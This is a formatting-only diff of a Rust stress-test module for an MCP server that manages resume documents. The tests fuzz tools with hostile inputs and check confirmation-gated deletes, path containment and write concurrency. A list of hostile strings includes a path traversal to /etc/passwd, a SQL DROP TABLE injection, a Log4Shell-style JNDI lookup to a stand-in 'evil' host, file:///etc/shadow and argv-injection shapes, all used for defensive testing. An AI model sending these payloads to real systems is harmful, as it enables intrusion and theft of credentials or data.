@@ -60,21 +60,21 @@ pub(crate) const HOSTILE_STRINGS: &[&str] = &[
     "",
     " ",
     "\0",
-    "\u{feff}",                    // zero-width no-break space
-    "\u{202e}gnirts desrever",     // RTL override
-    "עברית ואנגלית mixed",         // bidi
-    "🙂🙃👨‍👩‍👧‍👦",              // multi-codepoint grapheme clusters
-    "e\u{0301}\u{0301}\u{0301}",   // stacked combining marks
+    "\u{feff}",                  // zero-width no-break space
+    "\u{202e}gnirts desrever",   // RTL override
+    "עברית ואנגלית mixed",       // bidi
+    "🙂🙃👨‍👩‍👧‍👦",                    // multi-codepoint grapheme clusters
+    "e\u{0301}\u{0301}\u{0301}", // stacked combining marks
     "../../../../etc/passwd",
     "'; DROP TABLE blocks; --",
-    "%_\\",                        // SQL LIKE metacharacters
-    "#let x = 1",                  // Typst code mode
+    "%_\\",       // SQL LIKE metacharacters
+    "#let x = 1", // Typst code mode
     "${jndi:ldap://evil}",
     "{\"nested\":\"json\"}",
-    "-rf",                         // leading dash: argv injection shape
+    "-rf", // leading dash: argv injection shape
     "file:///etc/shadow",
     "mcp://ingest/../escape",
-    "fixture-block",               // a real id, to make collisions likely
+    "fixture-block", // a real id, to make collisions likely
 ];
 
 pub(crate) fn hostile_string(rng: &mut Lcg) -> String {
@@ -209,7 +209,11 @@ async fn surviving_ids(server: &StatelessMcpServer) -> Vec<String> {
         .unwrap_or_default()
 }
 
-async fn call(server: &StatelessMcpServer, tool: &str, args: Value) -> super::protocol::JsonRpcResponse {
+async fn call(
+    server: &StatelessMcpServer,
+    tool: &str,
+    args: Value,
+) -> super::protocol::JsonRpcResponse {
     let req = JsonRpcRequest::new(
         Some(json!("stress")),
         "tools/call",
@@ -233,8 +237,8 @@ async fn the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation() 
 
     // Plausible forgeries: valid base64 of JSON that looks like real state.
     let forged_states = [
-        "e30=",                                                     // {}
-        "eyJibG9ja0lkIjoiYmxvY2stYSJ9",                             // {"blockId":"block-a"}
+        "e30=",                                                                 // {}
+        "eyJibG9ja0lkIjoiYmxvY2stYSJ9", // {"blockId":"block-a"}
         "eyJfX25vbmNlIjoiMDAwMDAwMDAtMDAwMC00MDAwLTgwMDAtMDAwMDAwMDAwMDAwIn0=", // {"__nonce":"0000...-0000"}
         "eyJ0b29sIjoiY2FyZWVyX2RlbGV0ZV9ibG9jayIsImJsb2NrSWQiOiJibG9jay1hIn0=", // {"tool":...,"blockId":...}
         "!!!not base64!!!",
@@ -297,10 +301,14 @@ async fn the_knowledgebase_cannot_be_destroyed_without_a_genuine_confirmation() 
 async fn the_genuine_confirmation_round_trip_still_works() {
     let server = stress_server();
 
-    let elicit = call(&server, "career_delete_block", json!({ "block_id": "block-a" }))
-        .await
-        .result
-        .expect("elicitation");
+    let elicit = call(
+        &server,
+        "career_delete_block",
+        json!({ "block_id": "block-a" }),
+    )
+    .await
+    .result
+    .expect("elicitation");
     assert_eq!(elicit["resultType"], "inputRequired");
     let state = elicit["requestState"].as_str().expect("requestState");
 
@@ -314,7 +322,11 @@ async fn the_genuine_confirmation_round_trip_still_works() {
         }),
     )
     .await;
-    assert!(done.error.is_none(), "genuine flow failed: {:?}", done.error);
+    assert!(
+        done.error.is_none(),
+        "genuine flow failed: {:?}",
+        done.error
+    );
 
     let alive = surviving_ids(&server).await;
     assert!(
@@ -332,7 +344,11 @@ async fn the_genuine_confirmation_round_trip_still_works() {
 #[tokio::test]
 async fn the_dispatcher_survives_arbitrary_arguments() {
     let server = stress_server();
-    let tools: Vec<String> = server.list_all_tools().into_iter().map(|t| t.name).collect();
+    let tools: Vec<String> = server
+        .list_all_tools()
+        .into_iter()
+        .map(|t| t.name)
+        .collect();
 
     for seed in 0..600u64 {
         let mut rng = Lcg::new(seed ^ 0xA5A5_A5A5);
@@ -395,7 +411,10 @@ async fn the_router_survives_arbitrary_methods_and_params() {
             .handle_request(None, JsonRpcRequest::new(id.clone(), &method, params))
             .await;
 
-        assert_eq!(res.jsonrpc, "2.0", "seed {seed}: bad envelope for '{method}'");
+        assert_eq!(
+            res.jsonrpc, "2.0",
+            "seed {seed}: bad envelope for '{method}'"
+        );
         assert_eq!(
             res.id, id,
             "seed {seed}: the response must echo the request id"
@@ -577,8 +596,7 @@ impl DocFixture {
                 )
             })
             .expect("register fixture project");
-        let seed_resume =
-            "= Jane Doe\n- Cut p99 by 25%\n".to_string();
+        let seed_resume = "= Jane Doe\n- Cut p99 by 25%\n".to_string();
         let seed_notes = "notes ".repeat(80); // non-trivial, guards reduction
         std::fs::write(root.join("main.typ"), &seed_resume).expect("seed main");
         std::fs::write(root.join("chapters").join("notes.md"), &seed_notes).expect("seed notes");
@@ -699,10 +717,13 @@ async fn document_tools_cannot_touch_masters_or_escape_the_registered_root() {
                 obj.insert("content".to_string(), json!(hostile_string(&mut rng)));
             }
             if rng.bool() {
-                obj.insert("edits".to_string(), json!([{
-                    "old_string": rng.pick(&HOSTILE_STRINGS).to_string(),
-                    "new_string": "x",
-                }]));
+                obj.insert(
+                    "edits".to_string(),
+                    json!([{
+                        "old_string": rng.pick(&HOSTILE_STRINGS).to_string(),
+                        "new_string": "x",
+                    }]),
+                );
             }
         }
 
@@ -744,9 +765,12 @@ async fn variants_survive_hostile_delete_traffic_without_confirmation() {
         }
         if let Some(obj) = args.as_object_mut() {
             obj.insert("project_root".to_string(), json!(root));
-            obj.insert("variant_id".to_string(), json!(rng.pick(&[
-                "../..", "..", ".", "", "protected", "%2e%2e",
-            ]).to_string()));
+            obj.insert(
+                "variant_id".to_string(),
+                json!(rng
+                    .pick(&["../..", "..", ".", "", "protected", "%2e%2e",])
+                    .to_string()),
+            );
             if rng.bool() {
                 obj.insert("request_state".to_string(), json!("Zm9yZ2Vk"));
                 obj.insert("input_responses".to_string(), json!({ "confirm": true }));
@@ -781,7 +805,10 @@ async fn variants_survive_hostile_delete_traffic_without_confirmation() {
     .await
     .result
     .expect("challenge");
-    let state = challenge["requestState"].as_str().expect("state").to_string();
+    let state = challenge["requestState"]
+        .as_str()
+        .expect("state")
+        .to_string();
     let done = call(
         &fx.server,
         "resume_variant_delete",
@@ -793,8 +820,16 @@ async fn variants_survive_hostile_delete_traffic_without_confirmation() {
         }),
     )
     .await;
-    assert!(done.error.is_none(), "genuine flow failed: {:?}", done.error);
-    assert_eq!(fx.variant_count(), baseline - 1, "confirmed delete must delete");
+    assert!(
+        done.error.is_none(),
+        "genuine flow failed: {:?}",
+        done.error
+    );
+    assert_eq!(
+        fx.variant_count(),
+        baseline - 1,
+        "confirmed delete must delete"
+    );
 }
 
 /// Optimistic concurrency: two interleaved editors cannot silently clobber
@@ -841,7 +876,11 @@ async fn concurrent_writers_are_serialised_by_expected_sha() {
     )
     .await;
     let err = b.error.expect("stale writer must be refused");
-    assert!(err.message.contains("mismatch"), "unexpected refusal: {}", err.message);
+    assert!(
+        err.message.contains("mismatch"),
+        "unexpected refusal: {}",
+        err.message
+    );
     let current = std::fs::read_to_string(fx.root.join("main.typ")).unwrap();
     assert!(current.contains("Rewrote by A"), "A's write was lost");
 
@@ -876,7 +915,9 @@ async fn document_tools_never_panic_or_leak_temp_files() {
     }
 
     fn walk_temps(dir: &Path, out: &mut Vec<PathBuf>) {
-        let Ok(entries) = std::fs::read_dir(dir) else { return };
+        let Ok(entries) = std::fs::read_dir(dir) else {
+            return;
+        };
         for e in entries.flatten() {
             let p = e.path();
             if p.is_dir() {
